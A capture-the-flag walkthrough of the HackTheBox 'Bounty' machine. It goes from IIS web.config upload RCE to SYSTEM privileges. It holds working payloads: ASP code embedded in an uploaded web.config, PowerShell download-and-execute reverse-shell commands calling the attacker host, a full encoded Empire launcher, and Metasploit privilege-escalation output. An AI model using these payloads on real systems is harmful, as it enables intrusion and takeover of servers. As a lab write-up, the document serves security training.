# Hackthebox Bounty


Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.


## Recon

First, as always. we perform our initial enumeration of the box using Nmap.

```
Nmap scan report for 10.10.10.93
Host is up (0.037s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

So we only find one open service which seems to be a webserver.


### Content Discovery

As usual, let's perform some initial content discovery using Gobuster.


```
root@kali:~/htb/bounty# gobuster -u http://10.10.10.93 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt                                                                     
                                                                                                                                                                                                             
=====================================================                                                                                                                                                        
Gobuster v2.0.0              OJ Reeves (@TheColonial)                                                                                                                                                        
=====================================================                                                                                                                                                        
[+] Mode         : dir                                                                                                                                                                                       
[+] Url/Domain   : http://10.10.10.93/                                                                                                                                                                       
[+] Threads      : 10                                                                                                                                                                                        
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt                                                                                                            
[+] Status codes : 200,204,301,302,307,403                                                                                                                                                                   
[+] Timeout      : 10s                                                                                                                                                                                       
=====================================================                                                                                                                                                        
2018/11/15 20:42:24 Starting gobuster                                                                                                                                                                        
=====================================================                                                                                                                                                        
/aspnet_client (Status: 301)                                                                                                                                                                                 
/uploadedfiles (Status: 301)
/uploadedFiles (Status: 301)
/UploadedFiles (Status: 301)
/Aspnet_client (Status: 301)
/aspnet_Client (Status: 301)
/ASPNET_CLIENT (Status: 301)
/Aspnet_Client (Status: 301)
=====================================================
2018/11/15 20:46:33 Finished
=====================================================

```

Uploadedfiles seems interesting. Nwxt I run a wordlist with files:

```
root@kali:~/htb/bounty# gobuster -u http://10.10.10.93 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.93/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/11/15 21:13:02 Starting gobuster
=====================================================
/. (Status: 200)
/iisstart.htm (Status: 200)
/Transfer.aspx (Status: 200)
=====================================================
2018/11/15 21:15:28 Finished
=====================================================

```

Visiting the Trasnfer.aspx we see a file upload page. 

So by trying to upload different files I note that only imagefiles seems to work. We know that the page is an aspx file. After manually trying some variants of aspx I googled for valid extensions and found this page:
https://msdn.microsoft.com/en-us/library/2wawkw1c.aspx

Saving all these extensions and trying them thourgh burp Intruder, I found that ".config" is allowed. 

```
curl --silent https://msdn.microsoft.com/en-us/library/2wawkw1c.aspx | grep "<p>." | awk -F">" '{print $2}'| awk -F"<" '{print $1}' | grep "^\." | sed -e 's/,//g' > extensions.txt
```

## Initial Compromise

So googling around a bit I found this blog showing how to get RCE through web.config uploads: https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/

I also checked if I could access my uploaded files in the "uploadedfiles" directory, which I could. So we know where our files gets stored.

The following request embeds some ASP code in a web.config file.

```
POST /Transfer.aspx HTTP/1.1
Host: 10.10.10.93
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.93/Transfer.aspx
Content-Type: multipart/form-data; boundary=---------------------------421525728904562863840560658
Content-Length: 1675
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------421525728904562863840560658
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwUKMTI3ODM5MzQ0Mg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkaYLmKw0cqLq0ZctY2aX2MLmomIo=
-----------------------------421525728904562863840560658
Content-Disposition: form-data; name="__EVENTVALIDATION"

/wEWAgKjkO+nBgLt3oXMAwNOpcf35mGEA6uh16l32frjBmbv
-----------------------------421525728904562863840560658
Content-Disposition: form-data; name="FileUpload1"; filename="web.config"
Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("ping 10.10.14.17")
o = cmd.StdOut.Readall()
Response.write(o)
%>
-->

-----------------------------421525728904562863840560658
Content-Disposition: form-data; name="btnUpload"

Upload
-----------------------------421525728904562863840560658--
```

We get a response saying our file was uploaded successfully.

So to trigger the execution we just browse to the file we uploaded: http://10.10.10.93/uploadedfiles/web.config and see if we recieve some ping requests.

```
root@kali:~/Downloads# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
15:04:31.661491 IP 10.10.10.93 > kali: ICMP echo request, id 1, seq 1, length 40
15:04:31.661517 IP kali > 10.10.10.93: ICMP echo reply, id 1, seq 1, length 40
15:04:32.656888 IP 10.10.10.93 > kali: ICMP echo request, id 1, seq 2, length 40
15:04:32.656914 IP kali > 10.10.10.93: ICMP echo reply, id 1, seq 2, length 40
15:04:33.655261 IP 10.10.10.93 > kali: ICMP echo request, id 1, seq 3, length 40
15:04:33.655286 IP kali > 10.10.10.93: ICMP echo reply, id 1, seq 3, length 40
15:04:34.656974 IP 10.10.10.93 > kali: ICMP echo request, id 1, seq 4, length 40
15:04:34.657001 IP kali > 10.10.10.93: ICMP echo reply, id 1, seq 4, length 40
```
Which we did, so we have verified that we have code execution on the box.

Let's get a reverse shell using powershell and Nishang. We host a shell on our webserver and then download and execute it:

```
POST /Transfer.aspx HTTP/1.1
Host: 10.10.10.93
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.93/Transfer.aspx
Content-Type: multipart/form-data; boundary=---------------------------1506855702582979792059798955
Content-Length: 1794
Cookie: ASPSESSIONIDQAQSBACS=OFENOPAAIIJLDFGMMHLPCDFG
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------1506855702582979792059798955
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwUKMTI3ODM5MzQ0Mg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkt05jMq+tE9PVaJx9CEZkHe973Kw=
-----------------------------1506855702582979792059798955
Content-Disposition: form-data; name="__EVENTVALIDATION"

/wEWAgLZjpnXCgLt3oXMA+VAWsISOswSmsAvDyfSRPXCgIr6
-----------------------------1506855702582979792059798955
Content-Disposition: form-data; name="FileUpload1"; filename="web.config"
Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set objShell = CreateObject("WScript.Shell")
strCommand = "cmd /c powershell.exe -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.17/shell.ps1')"
Set objShellExec = objShell.Exec(strCommand)
strOutput = objShellExec.StdOut.ReadAll()
WScript.StdOut.Write(strOutput)
WScript.Echo(strOutput)
%>

-----------------------------1506855702582979792059798955
Content-Disposition: form-data; name="btnUpload"

Upload
-----------------------------1506855702582979792059798955--
```

Catching the shell with netcat:

```
root@kali:~/htb# nc -lvp 443
listening on [any] 443 ...
10.10.10.93: inverse host lookup failed: Unknown host
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.93] 49158
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
bounty\merlin
PS C:\windows\system32\inetsrv>
```

## Establish Foothold

The first thing I usually do when I have an initial foothold on a system is to upgrade our shell. This is because some tasks and exploits during our privesc phase may require a full TTY to work. Trust me, I have learned this the hard way.

Let's use Empire.

We create an HTTP listener and print the powershell launcher.

```
(Empire: listeners/http) > launcher powershell
powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAEEAYgBsAGUALgBQAFMAVgBFAHIAUwBpAE8ATgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAcgBFAEYAXQAuAEEAUwBTAEUATQBiAEwAWQAuAEcAZQBUAFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAGEATAB1AGUAKAAkAG4AdQBMAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAQQBMAD0AWwBDAE8AbABsAEUAYwBUAEkAbwBuAFMALgBHAGUAbgBlAFIASQBjAC4ARABpAEMAVABpAE8AbgBhAFIAWQBbAHMAVAByAGkATgBHACwAUwBZAFMAdABFAE0ALgBPAEIASgBlAGMAVABdAF0AOgA6AG4ARQBXACgAKQA7ACQAdgBBAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AGEAbAB9AEUAbABzAEUAewBbAFMAQwBSAGkAUAB0AEIAbABvAGMASwBdAC4AIgBHAEUAVABGAGkAZQBgAEwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBlACgAJABOAFUATABsACwAKABOAEUAdwAtAE8AQgBKAGUAQwBUACAAQwBvAEwAbABlAGMAVABJAG8AbgBzAC4ARwBFAG4ARQBSAGkAQwAuAEgAYQBTAGgAUwBFAHQAWwBzAFQAUgBpAE4AZwBdACkAKQB9AFsAUgBFAGYAXQAuAEEAcwBTAGUATQBCAGwAWQAuAEcAZQB0AFQAeQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBlAFQARgBJAEUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AVQBsAGwALAAkAFQAUgBVAEUAKQB9ADsAfQA7AFsAUwB5AFMAVABlAE0ALgBOAGUAVAAuAFMARQBSAHYAaQBDAGUAUABPAEkAbgB0AE0AYQBOAGEARwBFAFIAXQA6ADoARQBYAFAARQBjAHQAMQAwADAAQwBvAE4AVABpAG4AdQBlAD0AMAA7ACQAVwBjAD0ATgBFAFcALQBPAEIAagBFAEMAdAAgAFMAWQBTAHQAZQBNAC4ATgBFAFQALgBXAGUAQgBDAEwAaQBlAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBBAEQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAcgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAdAAuAFcARQBiAFIARQBRAHUARQBzAFQAXQA6ADoARABlAEYAQQB1AGwAdABXAEUAYgBQAHIAbwB4AFkAOwAkAFcAYwAuAFAAcgBvAFgAWQAuAEMAcgBFAEQARQBOAFQAaQBhAEwAcwAgAD0AIABbAFMAWQBzAHQAZQBNAC4ATgBFAFQALgBDAFIAZQBEAEUATgBUAGkAYQBMAEMAYQBDAEgAZQBdADoAOgBEAGUARgBBAFUAbABUAE4ARQBUAHcAbwBSAEsAQwBSAGUARABlAG4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAVABlAG0ALgBUAGUAeAB0AC4ARQBOAEMAbwBkAGkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQB0AGUAcwAoACcAOwAwAGEAXQBKAHIAYwB9AG8AcABDAHwAMwBoACkAPABTACUAQgB3AG4ANQBaAFIAWQBEACoAOABpAHgAUQBiACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA3ADoAOAAwACcAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAHcAQwAuAEgARQBBAGQAZQBSAHMALgBBAEQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AGIAVwBoAEQAKwBCACsAUABvADcASABHAHMAZQB4AGkAdAA4AGsARABYAFQAWABSAGwAKwAwAD0AIgApADsAJABkAGEAdABBAD0AJABXAEMALgBEAG8AVwBuAEwATwBBAEQARABhAFQAYQAoACQAcwBFAHIAKwAkAFQAKQA7ACQAaQB2AD0AJABkAEEAVABBAFsAMAAuAC4AMwBdADsAJABkAEEAdABBAD0AJABEAEEAVABBAFsANAAuAC4AJABEAEEAVABhAC4ATABlAG4AZwB0AEgAXQA7AC0AagBPAEkATgBbAEMAaABBAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=
```

We can then host that launcher in an html file on a webserver. Run it from the victim:

```
PS C:\Users\merlin\Desktop> powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.17:81/empire.html')"
```

```
(Empire: listeners) > [*] Sending POWERSHELL stager (stage 1) to 10.10.10.93
[*] New agent LG2SKNUB checked in
[+] Initial agent LG2SKNUB from 10.10.10.93 now active (Slack)
[*] Sending agent (stage 2) to LG2SKNUB at 10.10.10.93
```
So now we have an active Empire agent running on the victim.

## Privilege Escalation

A good way to start the privesc is to use some enumeration scripts/modules. For Windows I usually use the followin:

- Powerup
- Sherlock.ps1
- Metasploit Local Exploit Suggester


We can launch the Powerup module from our Empire agent:

```
Job started: N9GMYX                                                                                                                  
                                                                                                                             
[*] Running Invoke-AllChecks                                                                                                   
                                                                                                                                     
[*] Checking if user is in a local group with administrative privileges...                                                    
                                                                                                                                       
[*] Checking for unquoted service paths...                                                                                           
                                                                                                                              
[*] Checking service executable and argument permissions...                                                                                                                                                 
                                                                                                                              
[*] Checking service permissions...                                                                                                
                                                                                                                                   
[*] Checking %PATH% for potentially hijackable DLL locations...                                                          
                                                                                                                                     
[*] Checking for AlwaysInstallElevated registry key...                                                                        
                                                                                                                               
[*] Checking for Autologon credentials in registry...                                                                         
                                                                                                                            
[*] Checking for modifidable registry autoruns and configs...                                                                      
                                                                                                                                  
[*] Checking for modifiable schtask files/configs... 

[*] Checking for unattended install files...                                                                                         
                                                                                                                             
UnattendPath : C:\Windows\Panther\Unattend.xml                                                                                    
                                                                                                                                                                                                          
[*] Checking for encrypted web.config strings...                                                                         
                                                                                                                                                                     
[*] Checking for encrypted application pool and virtual directory passwords...                                                      
                                                                                                                                   
[*] Checking for plaintext passwords in McAfee SiteList.xml files....                                                                   
                                                                                                                                
[*] Checking for cached Group Policy Preferences .xml files....                                                                     
                                                                                                                                                                                                                                                  
Invoke-AllChecks completed! 

```
Checking the Unattended file I note the following where a possible password would have been:
`<Password>*SENSITIVE*DATA*DELETED*</Password>`

Let's continue our privesc endeavor using Sherlock.

We can import powershell script on our victim through Empire:

```
Empire: LG2SKNUB) > scriptimport ../../privesc/Sherlock.ps1
[*] Tasked LG2SKNUB to run TASK_SCRIPT_IMPORT
[*] Agent LG2SKNUB tasked with task ID 2
(Empire: LG2SKNUB) > [*] Agent LG2SKNUB returned results.
script successfully saved in memory
[*] Valid results returned by 10.10.10.93

(Empire: LG2SKNUB) > scriptcmd Find-AllVulns
[*] Tasked LG2SKNUB to run TASK_SCRIPT_COMMAND
[*] Agent LG2SKNUB tasked with task ID 3

Title      : User Mode to Ring (KiTrap0D)                                                                                                                                                                    
MSBulletin : MS10-015                                                                                                                                                                                        
CVEID      : 2010-0232                                                                                                                                                                                       
Link       : https://www.exploit-db.com/exploits/11199/                                                                                                                                                      
VulnStatus : Not supported on 64-bit systems                                                                                                                                                                 
                                                                                                                                                                                                             
Title      : Task Scheduler .XML                                                                                                                                                                             
MSBulletin : MS10-092                                                                                                                                                                                        
CVEID      : 2010-3338, 2010-3888                                                                                                                                                                            
Link       : https://www.exploit-db.com/exploits/19930/                                                                                                                                                      
VulnStatus : Appears Vulnerable                                                                                                                                                                              
                                                                                                                                                                                                             
Title      : NTUserMessageCall Win32k Kernel Pool Overflow                                                                                                                                                   
MSBulletin : MS13-053                                                                                                                                                                                        
CVEID      : 2013-1300                                                                                                                                                                                       
Link       : https://www.exploit-db.com/exploits/33213/                                                                                                                                                      
VulnStatus : Not supported on 64-bit systems                                                                                                                                                                 
                                                                                                                                                                                                             
Title      : TrackPopupMenuEx Win32k NULL Page                                                                                                                                                               
MSBulletin : MS13-081                                                                                                                                                                                        
CVEID      : 2013-3881                                                                                                                                                                                       
Link       : https://www.exploit-db.com/exploits/31576/                                                                                                                                                      
VulnStatus : Not supported on 64-bit systems                                                                                                                                                                 
                                                                                                                                                                                                             
Title      : TrackPopupMenu Win32k Null Pointer Dereference                                                                                                                                                  
MSBulletin : MS14-058                                                                                                                                                                                        
CVEID      : 2014-4113                                                                                                                                                                                       
Link       : https://www.exploit-db.com/exploits/35101/                                                                                                                                                      
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Not Supported on single-core systems

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable
```

Sherlock found some potential vulnerabilities. 

To exploit these I would like a meterpreter shell on the box.

We can pass a session from Empire to Metasploit with the following steps:


Create a meterpreter powershell payload with Unicorn:

```
root@kali:~/tools/post-exploitation/unicorn# python unicorn.py windows/meterpreter/reverse_http 10.10.14.17 4444
```

Host the payload and download and execute it through Empire:

```
(Empire: LG2SKNUB) > shell IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.17:8000/powershel_attack.txt')
```

Catch the shell:

```
msf exploit(multi/handler) >
[*] http://10.10.14.17:4444 handling request from 10.10.10.93; (UUID: 4irxxfn6) Encoded stage with x86/shikata_ga_nai                                                                                       
[*] http://10.10.14.17:4444 handling request from 10.10.10.93; (UUID: 4irxxfn6) Staging x86 payload (180854 bytes) ...                                                                                      
[*] Meterpreter session 1 opened (10.10.14.17:4444 -> 10.10.10.93:60109) at 2018-11-18 10:32:28 +0100

msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : BOUNTY
OS              : Windows 2008 R2 (Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: BOUNTY\merlin
meterpreter > 
```

Running local_exploit_suggester as a 32-bit process:


```
msf post(multi/recon/local_exploit_suggester) > run                                                                                                                                                          
                                                                                                                                                                                                             
[*] 10.10.10.93 - Collecting local exploits for x86/windows...                                                                                                                                               
[*] 10.10.10.93 - 28 exploit checks are being tried...                                                                                                                                                       
[+] 10.10.10.93 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.                                                                                                            
[+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.                                                                                                          
[+] 10.10.10.93 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.                                                                                                          
[+] 10.10.10.93 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.                                                                                                     
[+] 10.10.10.93 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.                                                                                                     
[+] 10.10.10.93 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.                                                                                                    
[+] 10.10.10.93 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.                                                                 
[+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.                                                                                                           
[+] 10.10.10.93 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.                                                                                                               
[*] Post module execution completed    
```

Migrating our x86 meterpreter to 64-bit


```
meterpreter > ps                                                                                                                                                                                             
                                                                                                                                                                                                             
Process List                                                                                                                                                                                                 
============                                                                                                                                                                                                 
                                                                                                                                                                                                             
 PID   PPID  Name                     Arch  Session  User           Path                                                                                                                                     
 ---   ----  ----                     ----  -------  ----           ----          

 1744  1704  powershell.exe           x64   0        BOUNTY\merlin  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 1836  460   dllhost.exe                                            
 1988  460   msdtc.exe                                              
 2236  1744  powershell.exe           x86   0        BOUNTY\merlin  C:\Windows\syswow64\Windowspowershell\v1.0\powershell.exe
 2348  804   taskeng.exe                                            
 2520  460   sppsvc.exe                                             
 2944  1688  cmd.exe                  x64   0                       C:\Windows\System32\cmd.exe
 2956  308   conhost.exe              x64   0        BOUNTY\merlin  C:\Windows\System32\conhost.exe
 2972  2944  powershell.exe           x64   0        BOUNTY\merlin  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 3040  2972  powershell.exe           x64   0        BOUNTY\merlin  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

meterpreter > migrate 1744
[*] Migrating from 2236 to 1744...
[*] Migration completed successfully.
```

Running local_exploit_suggester as a 64-bit process:


```
msf post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.93 - Collecting local exploits for x64/windows...
[*] 10.10.10.93 - 10 exploit checks are being tried...
[+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Post module execution completed
```

Now we have a lot of enumeration on possible exploits. So next we need to go through all the output and find some exploits.

ms10_092_schelevator appears on both x86 and x64 exploit suggester output. Let's start by trying that one:

```
msf exploit(windows/local/ms10_092_schelevator) > exploit 

[*] Started reverse TCP handler on 10.10.14.17:4445 
[*] Preparing payload at C:\Windows\TEMP\gSYxXrbhpw.exe
[*] Creating task: 1QT6JmllNpLF
[*] SUCCESS: The scheduled task "1QT6JmllNpLF" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\1QT6JmllNpLF...
[*] Original CRC32: 0xdf71d04c
[*] Final CRC32: 0xdf71d04c
[*] Writing our modified content back...
[*] Validating task: 1QT6JmllNpLF
[*] 
[*] Folder: \
[*] TaskName                                 Next Run Time          Status         
[*] ======================================== ====================== ===============
[*] 1QT6JmllNpLF                             12/1/2018 11:45:00 AM  Ready          
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "1QT6JmllNpLF" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "1QT6JmllNpLF" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (179779 bytes) to 10.10.10.93
[*] SUCCESS: Attempted to run the scheduled task "1QT6JmllNpLF".
[*] SCHELEVATOR
[*] Deleting the task...
[*] Meterpreter session 2 opened (10.10.14.17:4445 -> 10.10.10.93:60113) at 2018-11-18 10:45:48 +0100
[*] SUCCESS: The scheduled task "1QT6JmllNpLF" was successfully deleted.
[*] SCHELEVATOR

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```
There are most likely more ways to privesc this box, I may return and try them later on.
